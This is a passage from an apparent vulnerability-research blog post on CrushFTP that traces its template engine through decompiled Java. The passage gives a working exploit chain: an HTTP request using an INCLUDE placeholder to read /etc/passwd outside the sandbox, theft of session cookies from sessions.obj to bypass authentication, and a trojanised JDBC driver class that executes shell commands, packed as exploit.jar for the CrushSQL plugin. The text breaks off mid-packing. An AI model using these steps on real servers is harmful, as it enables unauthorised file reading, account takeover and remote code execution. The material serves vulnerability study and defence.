</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">writeResponse</span>(String response, <span style="color:#66d9ef">boolean</span> log, <span style="color:#66d9ef">int</span> code, <span style="color:#66d9ef">boolean</span> convertVars, <span style="color:#66d9ef">boolean</span> json, <span style="color:#66d9ef">boolean</span> acceptsGZIP, <span style="color:#66d9ef">boolean</span> log_header) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (convertVars) {
</span></span><span style="display:flex;"><span>         response <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">thisObj</span>.<span style="color:#a6e22e">change_vars_to_values</span>(response, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSessionHTTP</span>.<span style="color:#a6e22e">thisSession</span>);
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p>In the preceding code, it was noted that only the <code>response</code> argument was passed to the <code>writeResponse</code> method. However, upon closer inspection, it becomes evident that the primary <code>writeResponse</code> method requires an additional boolean argument called <code>convertVars</code> as its third parameter. The first <code>writeResponse</code> call sets this argument to <code>true</code>, indicating that variable conversion (<code>convertVars</code>) is enabled. Consequently, the method <code>ServerStatus.thisObj.change_vars_to_values</code> will be invoked.</p>
<hr>
<h2 id="custom-templating-engine">Custom Templating Engine</h2>
<p>As noticed before, the <code>change_vars_to_values</code> method is called as a method from the <code>ServerStatus</code> class.</p>
<p><img src="/img/CrushFTP/Untitled_1.png" alt="Untitled"></p>
<p>The main chunk of code is rather big but not complicated to understand. Looking closely into the <code>change_vars_to_values</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">change_vars_to_values</span>(String in_str, SessionCrush the_session) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (the_session <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> change_vars_to_values(in_str, the_session.<span style="color:#a6e22e">user</span>, the_session.<span style="color:#a6e22e">user_info</span>, the_session);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> change_vars_to_values(in_str, <span style="color:#66d9ef">new</span> Properties(), <span style="color:#66d9ef">new</span> Properties(), the_session);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">change_vars_to_values</span>(String in_str, Properties user, Properties user_info, SessionCrush the_session) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> change_vars_to_values_static(in_str, user, user_info, the_session);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>The <code>change_vars_to_values</code> function calls <code>change_vars_to_values_static</code> , this function works like a template engine where it takes placeholder variable and substitute for it’s real value. It first parses the given placeholder value and then substitute it’s value by performing some <em>specified</em> operation.</p>
<ul>
<li>By specified, I meant that the application has defined methods and classes to substitute specific keywords. For the file read vulnerability, there is one such method as well, we will be gooing</li>
</ul>
<p>For example, the following code will replace the placeholders with specified values by retrieving from configurations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">change_vars_to_values_static</span>(String in_str, Properties user, Properties user_info, SessionCrush the_session) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>      String r1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%&#34;</span>;
</span></span><span style="display:flex;"><span>      String r2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%&#34;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> r <span style="color:#f92672">=</span> 0; r <span style="color:#f92672">&lt;</span> 2; r<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;beep&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;beep&#34;</span> <span style="color:#f92672">+</span> r2, <span style="color:#e6db74">&#34;&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;hostname&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;hostname&#34;</span> <span style="color:#f92672">+</span> r2, hostname); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;server_time_date&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;server_time_date&#34;</span> <span style="color:#f92672">+</span> r2, (<span style="color:#66d9ef">new</span> Date()).<span style="color:#a6e22e">toString</span>()); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;login_number&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;login_number&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;user_number&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;users_connected&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;users_connected&#34;</span> <span style="color:#f92672">+</span> r2, thisObj.<span style="color:#a6e22e">getTotalConnectedUsers</span>()); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_password&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_password&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;current_password&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_name&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_name&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user, <span style="color:#e6db74">&#34;username&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_anonymous_password&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_anonymous_password&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;user_name&#34;</span>).<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;anonymous&#34;</span>) <span style="color:#f92672">?</span> uSG(user_info, <span style="color:#e6db74">&#34;current_password&#34;</span>) : <span style="color:#e6db74">&#34;&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_current_dir&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_current_dir&#34;</span> <span style="color:#f92672">+</span> r2, the_session.<span style="color:#a6e22e">get_PWD</span>()); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_sessionid&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_sessionid&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;CrushAuth&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_site_commands_text&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_site_commands_text&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user, <span style="color:#e6db74">&#34;site&#34;</span>)); 
</span></span><span style="display:flex;"><span>          
</span></span><span style="display:flex;"><span>          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>If the given placeholder is something like <code>{{ user_name }}</code> , it will give the current user’s name which in this case will be <code>anonymous</code> as we will make the connection as a guest. This is a typical behavior of a template rendering as we commonly see in Jinja (Python’s flask) or Razor (.NET) templates.</p>
<p><img src="/img/CrushFTP/Untitled_2.png" alt="Untitled"></p>
<p>As  we can see, the given <code>user_name</code> has been replaced with current user’s name.</p>
<p>There are certain values which are being processed differently:</p>
<p><img src="/img/CrushFTP/Untitled_3.png" alt="Untitled"></p>
<p>Two things that seems to be of interesting from exploitation point of view are <code>&lt;LIST&gt;</code> and <code>&lt;INCLUDE&gt;</code> and we see if such placeholders are passed to the <code>change_vars_to_values_static</code> method, it ends up calling <code>get_dir_list</code> and <code>do_include_file_command</code> respectively. Calling <code>get_dir_list</code> resulted in a failure:</p>
<p><img src="/img/CrushFTP/Untitled_4.png" alt="Untitled"></p>
<p>The reason is rather clear why this happens, checking the method <code>get_dir_list</code> , we see that it only lists the files/folders from the user’s VFS (Virtual File Share) given that the anonymous user will not have any VFS configured for it, it does make sense why it failed simply:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">get_dir_list</span>(String in_str, SessionCrush the_session) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    String command <span style="color:#f92672">=</span> in_str.<span style="color:#a6e22e">substring</span>(in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;&lt;LIST&gt;&#34;</span>) <span style="color:#f92672">+</span> 6, in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;&lt;/LIST&gt;&#34;</span>));
</span></span><span style="display:flex;"><span>    String path <span style="color:#f92672">=</span> command.<span style="color:#a6e22e">trim</span>();
</span></span><span style="display:flex;"><span>    Vector list <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Vector();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>path.<span style="color:#a6e22e">startsWith</span>(the_session.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;root_dir&#34;</span>)))
</span></span><span style="display:flex;"><span>      path <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">valueOf</span>(the_session.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;root_dir&#34;</span>)) <span style="color:#f92672">+</span> path.<span style="color:#a6e22e">substring</span>(1); 
</span></span><span style="display:flex;"><span>    the_session.<span style="color:#a6e22e">uVFS</span>.<span style="color:#a6e22e">getListing</span>(list, path);
</span></span><span style="display:flex;"><span>    StringBuffer add_str <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuffer();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> 0; x <span style="color:#f92672">&lt;</span> list.<span style="color:#a6e22e">size</span>(); x<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      Properties item <span style="color:#f92672">=</span> list.<span style="color:#a6e22e">elementAt</span>(x);
</span></span><span style="display:flex;"><span>      LIST_handler.<span style="color:#a6e22e">generateLineEntry</span>(item, add_str, <span style="color:#66d9ef">false</span>, path, <span style="color:#66d9ef">false</span>, the_session, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>    in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, <span style="color:#e6db74">&#34;&lt;LIST&gt;&#34;</span> <span style="color:#f92672">+</span> command <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/LIST&gt;&#34;</span>, add_str.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> in_str;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span></code></pre></div><h3 id="arbitrary-file-read-vulnerability-via-ssti">Arbitrary File Read Vulnerability via SSTI</h3>
<p>Now, moving on to the <code>do_include_file_command</code> , let’s analyze the method:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">do_include_file_command</span>(String in_str) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>      String file_name <span style="color:#f92672">=</span> in_str.<span style="color:#a6e22e">substring</span>(in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;&lt;INCLUDE&gt;&#34;</span>) <span style="color:#f92672">+</span> 9, in_str.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;&lt;/INCLUDE&gt;&#34;</span>));
</span></span><span style="display:flex;"><span>      RandomAccessFile includer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RandomAccessFile((File)<span style="color:#66d9ef">new</span> File_S(file_name), <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> temp_array <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>(<span style="color:#66d9ef">int</span>)includer.<span style="color:#a6e22e">length</span>()<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>      includer.<span style="color:#a6e22e">read</span>(temp_array);
</span></span><span style="display:flex;"><span>      includer.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>      String include_data <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">valueOf</span>(<span style="color:#66d9ef">new</span> String(temp_array)) <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">CRLF</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, <span style="color:#e6db74">&#34;&lt;INCLUDE&gt;&#34;</span> <span style="color:#f92672">+</span> file_name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/INCLUDE&gt;&#34;</span>, include_data);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception exception) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> in_str;
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Recalling that the disclosure for this vulnerability mentioned that VFS sandbox bypass meaning an attacker will be able to request any file on the system not just from the VFS. This is what made the vulnerability a rather severity one. In the above code snippet, we don’t see any explicit check against the given directory to be within the VFS like we saw in the <code>get_dir_list</code> , to give an overview, this method parses the given placeholder value, for example if <code>&lt;INCLUDE&gt;/etc/passwd&lt;/INCLUDE&gt;</code> , it will get the <code>/etc/passwd</code> and store it in the <code>file_name</code> and then using the <code>[includer.read](http://includer.read)</code>  method, it will read that file and then return the retrieved content.</p>
<p>Let’s test this out by reading the <code>/etc/passwd</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>GET /WebInterface/function/?command=zip<span style="color:#960050;background-color:#1e0010">&amp;</span>c2f=1QTL<span style="color:#960050;background-color:#1e0010">&amp;</span>path=&lt;<span style="color:#f92672">INCLUDE</span>&gt;/etc/passwd&lt;/<span style="color:#f92672">INCLUDE</span>&gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>names=* HTTP/1.1
</span></span><span style="display:flex;"><span>Host: localhost:8080
</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.31.0
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
</span></span><span style="display:flex;"><span>Accept: */*
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>Cookie: currentAuth=1QTL; CrushAuth=1715144049924_XPU0xRbx1hIJZnsTuFUQ9l8wFI1QTL
</span></span></code></pre></div><p><img src="/img/CrushFTP/Untitled_5.png" alt="Untitled"></p>
<p>Retrieving the contents of <code>/etc/passwd</code> using the <code>INCLUDE</code> template.</p>
<p>This is the vulnerability which was mainly discussed everywhere but rather what happened here is the custom templating engine that CrushFTP has implemented and the <code>INCLUDE</code> which is a specified template for retrieving specific file. Since the direct call of this function does not check for files within the VFS allowing us to traverse through the whole file system.</p>
<h4 id="authentication-bypass-via-sessionsobj">Authentication Bypass via <code>sessions.obj</code></h4>
<p>Using this Arbitrary File read vulnerability, we can get the session cookies for the users by reading the <code>sessions.obj</code> , this file contains raw data and also stores session cookies for the logged in users. Once retrieved, one can extract the session cookies and then use it to access the CrushFTP functionalities.
<img src="/img/CrushFTP/sessions_obj.png" alt="Untitled"></p>
<hr>
<h2 id="leveraging-to-rce">Leveraging to RCE</h2>
<p>There was also a vague mention of how this vulnerability can open certain avenues to perform RCE. I walked through the application from the admin session to find if there is any specific functionalities which may let us achieve code execution. One of such functionalities was</p>
<p>Preferences → Plugins → CrushSQL</p>
<p><img src="/img/CrushFTP/Untitled_6.png" alt="Untitled"></p>
<p>I tried to compile a jar file by having a <code>Main.class</code> file in it with the <code>Driver</code> as the public class name but it returned following error:</p>
<blockquote>
<p><code>java.lang.ClassCastException</code>: class Main cannot be cast to class <code>java.sql.Driver</code> (Main is in unnamed module of loader <code>java.net.URLClassLoader @62f16978; java.sql.Driver</code> is in module <code>java.sql</code> of loader &lsquo;platform&rsquo;)</p></blockquote>
<p><img src="/img/CrushFTP/Untitled_7.png" alt="Untitled"></p>
<p>The error occurs because the class <code>Driver</code> is being incorrectly cast to the interface <code>java.sql.Driver</code>, suggesting an attempt to use <code>Driver</code> as a JDBC driver, which it is not, leading to a <code>ClassCastException</code>.</p>
<p>So in order to keep things simple, I downloaded the <a href="https://repo1.maven.org/maven2/mysql/mysql-connector-java/5.0.4/mysql-connector-java-5.0.4.jar">mysqlconnector jar</a> file and then decompressed the jar file and then changed the <code>Driver.class</code> by adding my own code and then recompiled the <code>.java</code> file to <code>class</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ζ cat org/gjt/mm/mysql/Driver.java                                                                                                                                                                                  
</span></span><span style="display:flex;"><span>ackage org.gjt.mm.mysql;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import java.io.IOException;
</span></span><span style="display:flex;"><span>import java.sql.SQLException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>public class Driver extends com.mysql.jdbc.Driver <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    public Driver<span style="color:#f92672">()</span> throws SQLException <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        super<span style="color:#f92672">()</span>; // Call the constructor of the superclass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        // Your additional code here
</span></span><span style="display:flex;"><span>        String cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;touch /tmp/curshftp_pwned&#34;</span>;
</span></span><span style="display:flex;"><span>        try <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Process process <span style="color:#f92672">=</span> Runtime.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            process.waitFor<span style="color:#f92672">()</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> catch <span style="color:#f92672">(</span>IOException | InterruptedException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            // Handle the exception as needed
</span></span><span style="display:flex;"><span>            e.printStackTrace<span style="color:#f92672">()</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                                                                                                                                                                                                   
</span></span><span style="display:flex;"><span>ζ javac org/gjt/mm/mysql/Driver.java                                                                                                                                                                                
</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>Note: org/gjt/mm/mysql/Driver.java uses or overrides a deprecated API.
</span></span><span style="display:flex;"><span>Note: Recompile with -Xlint:deprecation <span style="color:#66d9ef">for</span> details.
</span></span></code></pre></div><p>Once done, it is time to pack it back to jar again</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ζ jar cvf exploit.jar  .                                                                                                                                                                                            
</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>added manifest
</span></span><span style="display:flex;"><span>ignoring entry META-INF/
</span></span><span style="display:flex;"><span>adding: META-INF/INDEX.LIST<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 383<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 159<span style="color:#f92672">)(</span>deflated 58%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ignoring entry META-INF/MANIFEST.MF
</span></span><span style="display:flex;"><span>adding: com/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 0<span style="color:#f92672">)(</span>stored 0%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/AssertionFailedException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 914<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 472<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Blob.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3604<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1757<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/BlobFromLocator$LocatorInputStream.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2116<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1133<span style="color:#f92672">)(</span>deflated 46%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/BlobFromLocator.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 8472<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 4434<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Buffer.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 11778<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 5114<span style="color:#f92672">)(</span>deflated 56%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CallableStatement$CallableStatementParam.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1366<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 733<span style="color:#f92672">)(</span>deflated 46%<span style="color:#f92672">)</span>
